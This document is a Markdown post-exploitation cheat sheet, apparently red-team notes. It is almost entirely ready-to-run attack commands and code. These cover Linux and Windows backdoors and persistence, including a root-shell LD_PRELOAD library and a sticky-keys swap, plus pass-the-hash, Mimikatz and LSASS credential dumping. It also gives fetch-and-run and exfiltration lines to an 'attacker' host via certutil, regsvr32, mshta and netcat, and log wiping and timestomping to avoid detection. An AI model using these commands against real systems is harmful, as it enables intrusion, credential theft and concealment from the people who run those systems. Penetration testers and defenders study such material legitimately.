# Post-Exploitation

## Overview

Post-exploitation activities occur after initial access is gained. The goal is to maintain access, escalate privileges, move laterally, and achieve objectives while avoiding detection.

---

## Maintaining Access & Persistence

### Linux Persistence

#### Cron Jobs
```bash
# Add cron job
(crontab -l 2>/dev/null; echo "@reboot /tmp/backdoor.sh") | crontab -

# System-wide cron
echo "@reboot root /tmp/backdoor.sh" >> /etc/crontab

# Cron directories
/etc/cron.d/
/etc/cron.daily/
/etc/cron.hourly/
```

#### SSH Keys
```bash
# Add SSH key for root
mkdir -p /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

#### Backdoor User
```bash
# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:Password123" | chpasswd
usermod -aG sudo backdoor

# Or add to sudoers
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```

#### SUID Backdoor
```bash
# Copy bash and set SUID
cp /bin/bash /tmp/.hidden
chmod 4755 /tmp/.hidden

# Execute later
/tmp/.hidden -p
```

#### LD_PRELOAD Backdoor
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
# Compile
gcc -fPIC -shared -o backdoor.so backdoor.c -nostartfiles

# Add to environment
echo "export LD_PRELOAD=/lib/backdoor.so" >> ~/.bashrc
```

#### Systemd Service
```bash
# Create service file
cat << EOF > /etc/systemd/system/backdoor.service
[Unit]
Description=System Service

[Service]
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor
systemctl start backdoor
```

### Windows Persistence

#### Registry Autoruns
```powershell
# Run at startup
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"

# Current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"
```

#### Scheduled Tasks
```powershell
# Create scheduled task
schtasks /create /tn "Windows Update" /tr "C:\backdoor.exe" /sc onlogon /ru System

# Or with PowerShell
$action = New-ScheduledTaskAction -Execute "C:\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "System Service" -Action $action -Trigger $trigger -RunLevel Highest
```

#### WMI Event Subscription
```powershell
# Permanent WMI subscription
$filterName = 'BotFilter'
$consumerName = 'BotConsumer'
$exePath = 'C:\backdoor.exe'

$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = $filterName
    EventNamespace = 'root\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = $consumerName
    ExecutablePath = $exePath
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter
    Consumer = $Consumer
}
```

#### Sticky Keys Backdoor
```powershell
# Replace sethc.exe (Sticky Keys) with cmd.exe
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Press Shift 5 times at login screen to get CMD as SYSTEM
```

#### DLL Hijacking
```powershell
# Place malicious DLL in application directory
# Or in Windows system directories with weak permissions
```

---

## Lateral Movement

### Pass-the-Hash
```bash
# PSExec with PTH
pth-winexe -U 'DOMAIN/user%hash' //target cmd

# Impacket
impacket-psexec -hashes :<NTLM> administrator@target
impacket-wmiexec -hashes :<NTLM> administrator@target

# CrackMapExec
crackmapexec smb target -u admin -H <NTLM> -x "whoami"
```

### Pass-the-Ticket (Kerberos)
```powershell
# Mimikatz
mimikatz# sekurlsa::tickets /export
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe dump /luid:0x3e7 /service:krbtgt
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Overpass-the-Hash
```powershell
# Use NTLM hash to get Kerberos TGT
mimikatz# sekurlsa::pth /user:admin /domain:domain.local /ntlm:<hash> /run:powershell
```

### Remote Execution

#### PSExec
```bash
# Impacket PSExec
impacket-psexec domain/user:password@target

# Sysinternals PSExec
psexec \\target -u domain\user -p password cmd
```

#### WMI
```powershell
# Execute command via WMI
wmic /node:target /user:domain\user /password:password process call create "cmd.exe /c command"

# Impacket WMIExec
impacket-wmiexec domain/user:password@target
```

#### WinRM
```powershell
# PowerShell Remoting
Enter-PSSession -ComputerName target -Credential domain\user
Invoke-Command -ComputerName target -ScriptBlock {whoami}

# Evil-WinRM
evil-winrm -i target -u user -p password
```

#### DCOM
```powershell
# Execute via DCOM
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c backdoor.exe","Minimized")
```

### RDP Hijacking
```powershell
# List sessions
query user

# Hijack session (requires SYSTEM)
tscon <session_id> /dest:<your_session_name>
```

---

## Credential Harvesting

### Windows

#### Mimikatz
```powershell
# Dump credentials
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Dump SAM
mimikatz# lsadump::sam

# Dump LSA secrets
mimikatz# lsadump::secrets

# Export tickets
mimikatz# sekurlsa::tickets /export
```

#### LSASS Dump
```powershell
# Task Manager method
# Right-click lsass.exe -> Create dump file

# Procdump
procdump.exe -ma lsass.exe lsass.dmp

# Load in Mimikatz
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

#### Registry Hives
```powershell
# Save SAM and SYSTEM
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

# Extract with Impacket
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Linux

#### Dump /etc/shadow
```bash
cat /etc/shadow

# Or if not directly accessible
strings /dev/mem | grep root:
```

#### Browser Saved Passwords
```bash
# Firefox
~/.mozilla/firefox/*.default/logins.json

# Chrome
~/.config/google-chrome/Default/Login Data

# Extract with tools
python3 firefox_decrypt.py
```

#### SSH Keys
```bash
# Find SSH private keys
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null

# Check for agent forwarding
echo $SSH_AUTH_SOCK
ssh-add -l
```

---

## Pivoting & Tunneling

### SSH Tunneling
```bash
# Local port forwarding
ssh -L local_port:target:target_port user@pivot

# Remote port forwarding
ssh -R remote_port:target:target_port user@pivot

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@pivot

# Use with proxychains
proxychains nmap target
```

### Chisel
```bash
# Server (on attacker)
./chisel server -p 8080 --reverse

# Client (on compromised host)
./chisel client attacker:8080 R:1080:socks

# Use SOCKS proxy
proxychains <command>
```

### Metasploit Pivoting
```bash
# Meterpreter
meterpreter> run autoroute -s 10.10.10.0/24
meterpreter> background

# Port forwarding
meterpreter> portfwd add -l 3389 -p 3389 -r 10.10.10.10

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
```

### Proxychains
```bash
# Configure /etc/proxychains.conf
[ProxyList]
socks5 127.0.0.1 1080

# Use with any tool
proxychains nmap -sT target
proxychains ssh user@target
```

---

## Data Exfiltration

### File Transfer Methods

#### HTTP
```bash
# Python HTTP server (on attacker)
python3 -m http.server 80

# Download file (on target)
wget http://attacker/file
curl -O http://attacker/file
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/file','file')"
```

#### SMB
```bash
# Impacket SMB server
impacket-smbserver share /path/to/share -smb2support

# Copy from target
copy file \\attacker\share\
```

#### FTP
```bash
# Start FTP server
python -m pyftpdlib -p 21

# Upload from target
ftp attacker
put file
```

#### Base64
```bash
# Encode file
base64 file > file.b64
cat file.b64  # Copy output

# Decode on attacker
echo "<base64>" | base64 -d > file
```

#### DNS Exfiltration
```bash
# Encode data in DNS queries
# Use tools like dnscat2, iodine
```

### Compression & Encryption
```bash
# Compress and encrypt before exfiltration
tar czf - /data | openssl enc -aes-256-cbc -pbkdf2 -out data.tar.gz.enc

# Decrypt on attacker
openssl enc -d -aes-256-cbc -pbkdf2 -in data.tar.gz.enc | tar xzf -
```

---

## Living Off the Land (LOLBins)

### Windows
```powershell
# certutil (download files)
certutil -urlcache -f http://attacker/file file

# bitsadmin
bitsadmin /transfer job http://attacker/file C:\file

# regsvr32 (execute remote script)
regsvr32 /s /n /u /i:http://attacker/file.sct scrobj.dll

# mshta (execute HTA)
mshta http://attacker/payload.hta

# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -w hidden -c <command>")
```

### Linux
```bash
# curl/wget (already mentioned)
# netcat
nc -l -p 1234 > file  # Receiver
nc attacker 1234 < file  # Sender

# Base64
base64 -w0 file  # Encode
```

---

## Domain Enumeration (Active Directory)

### PowerView
```powershell
# Import PowerView
Import-Module PowerView.ps1

# Get domain info
Get-Domain
Get-DomainController

# Get users
Get-DomainUser
Get-DomainUser -Identity admin

# Get computers
Get-DomainComputer

# Get groups
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# Find shares
Invoke-ShareFinder
Find-DomainShare

# ACL abuse
Find-InterestingDomainAcl
```

### BloodHound
```powershell
# Collect data with SharpHound
.\SharpHound.exe -c All

# Or with Python collector
bloodhound-python -u user -p password -d domain.local -dc dc.domain.local

# Import into BloodHound GUI
# Find attack paths to Domain Admin
```

### Mimikatz DCSync
```powershell
# Replicate domain credentials (requires DC replication rights)
mimikatz# lsadump::dcsync /domain:domain.local /user:Administrator
```

---

## Covering Tracks

### Clear Logs

#### Windows
```powershell
# Clear event logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Or with PowerShell
Clear-EventLog -LogName System
Clear-EventLog -LogName Security
Clear-EventLog -LogName Application

# Metasploit
meterpreter> clearev
```

#### Linux
```bash
# Clear auth logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Clear bash history
history -c
echo "" > ~/.bash_history

# Disable history
unset HISTFILE
export HISTFILESIZE=0
export HISTSIZE=0
```

### Timestomping
```bash
# Windows
timestomp file.exe -m "01/01/2020 12:00:00"

# Linux
touch -t 202001011200 file
```

### Hide Files
```bash
# Hidden attribute (Windows)
attrib +h +s file.exe

# Linux (dot prefix)
mv file .file
```

---

## Post-Exploitation Frameworks

### PowerShell Empire
```powershell
# Starkiller (GUI for Empire)
# Agents, listeners, modules
```

### Cobalt Strike
```
# Team Server
# Beacon payload
# Malleable C2 profiles
# Aggressor scripts
```

### Metasploit Post Modules
```bash
# Meterpreter post-exploitation
run post/windows/gather/hashdump
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_shares
run post/windows/gather/enum_logged_on_users
```

---

## Anti-Forensics

1. **Memory-only execution** - No disk artifacts
2. **Encrypted communications** - Hide C2 traffic
3. **Delete tools after use** - Remove evidence
4. **Disable logging** - Prevent detection
5. **Use native tools** - Blend in with normal activity
6. **Clear command history** - Remove traces
7. **Modify timestamps** - Hide file modifications
8. **Use secure delete** - Overwrite deleted files

---

## Further Reading

- Red Team Field Manual (RTFM)
- Windows Post-Exploitation Techniques
- Active Directory Security
- Metasploit Unleashed
